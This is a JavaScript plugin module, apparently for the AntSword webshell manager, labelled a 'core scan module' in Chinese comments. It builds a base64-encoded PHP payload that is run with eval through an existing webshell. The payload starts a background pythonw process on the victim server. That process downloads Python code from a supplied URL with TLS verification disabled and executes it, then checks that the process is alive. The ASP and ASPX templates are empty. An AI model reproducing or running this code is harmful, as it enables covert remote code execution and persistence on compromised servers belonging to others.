/**
 * 核心扫描模块
 */

class Bugscan {
  constructor(opt, argv) {
    return new Promise((res, rej) => {
      // 初始化核心模块
      let core = new antSword['core'][opt['type']](opt);
      // 请求数据
      core.request({
        _: this.template[opt['type']](argv.url, argv.tasks)
      }).then(res)
    });
  }

  get template() {
    return {
      php: (url, tasks) => {
        var funcode = `function execbg($cmd){if(substr(php_uname(),0,7)=="Windows"){pclose(popen("start /B ". $cmd, "r"));}else{exec($cmd." > /dev/null &");}}@execbg("pythonw -c \\"import ssl;ssl._create_default_https_context=ssl._create_unverified_context;exec(__import__('urllib2').urlopen('${url}').read())\\" -m ${tasks}");if(substr(php_uname(),0,7)=="Windows"){$cmd = "tasklist|findstr pythonw";}else{$cmd="ps -A|grep pythonw|grep -v grep";}@exec($cmd, $info);if($info){echo("1");}else{echo("0");}`
        var data = new Buffer(funcode).toString('base64');
        return `@eval(base64_decode("${data}"));`
      },
      asp: (url, tasks) => ``,
      aspx: (url, tasks) => ``
    }
  }

}

module.exports = Bugscan;
